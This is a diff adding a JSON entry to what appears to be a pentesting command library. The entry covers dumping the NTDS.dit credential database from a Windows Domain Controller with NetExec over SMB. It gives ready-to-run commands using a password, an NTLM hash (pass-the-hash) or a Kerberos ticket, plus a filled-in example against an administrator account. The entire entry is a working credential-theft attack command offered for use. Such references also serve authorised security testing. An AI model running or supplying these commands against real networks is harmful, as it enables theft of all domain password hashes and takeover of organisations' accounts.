@@ -1,0 +1,36 @@
+{
+  "id": "nxc-smb-ntds",
+  "name": "NetExec SMB NTDS Dump",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' --ntds",
+  "description": "Dump the NTDS.dit database from a Domain Controller to extract all domain hashes",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "ntds",
+    "credential-dumping",
+    "domain-controller",
+    "hashes"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' --ntds"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "nxc smb '<ip>' -u '<user>' --use-kcache --ntds"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'administrator' -p 'password' --ntds"
+  ]
+}
